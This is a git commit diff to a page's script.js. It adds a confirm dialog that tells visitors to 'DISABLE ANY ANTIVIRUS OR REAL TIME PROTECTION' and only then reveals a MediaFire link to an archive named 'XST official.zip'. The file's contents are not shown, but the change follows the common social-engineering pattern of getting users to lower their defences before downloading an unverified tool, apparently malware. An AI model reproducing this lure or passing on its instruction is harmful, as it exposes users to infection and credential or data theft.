da2695c9cfbc89d5bf63af104e6e2d4204f71453
superjhay29 <105788845+superjhay29@users.noreply.github.com>
2024-02-07 23:42:37 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,8 @@
 function showDownloadLink() {
-    document.getElementById('downloadLink').style.display = 'block';
-    document.getElementById('downloadLink').innerHTML = 'Download tool now<a href="https://download1531.mediafire.com/mrcpb9fmx0ugf4RDkrCEgoomUa4tB3HmHiE8Fq5uE93yir4YhOdkN6D2ZpPaxKFfNwPQwW5XUeKVUHZxp8VdO6hfrm44wK6od1s9WAP5xUiq4bC0ap2q2reaOojQqx8rCtAfdUcsAUHFxZNFgHCjOKNBgoE7KbiKbB36saix17qv9A/w6342v3tgerxdba/XST+official.zip">here</a>.';
+    var confirmDownload = confirm("DISABLE ANY ANTIVIRUS OR REAL TIME PROTECTION");
+    
+    if (confirmDownload) {
+        document.getElementById('downloadLink').style.display = 'block';
+        document.getElementById('downloadLink').innerHTML = 'Download tool now<a href="https://download1531.mediafire.com/mrcpb9fmx0ugf4RDkrCEgoomUa4tB3HmHiE8Fq5uE93yir4YhOdkN6D2ZpPaxKFfNwPQwW5XUeKVUHZxp8VdO6hfrm44wK6od1s9WAP5xUiq4bC0ap2q2reaOojQqx8rCtAfdUcsAUHFxZNFgHCjOKNBgoE7KbiKbB36saix17qv9A/w6342v3tgerxdba/XST+official.zip">here</a>.';
+    }
 }
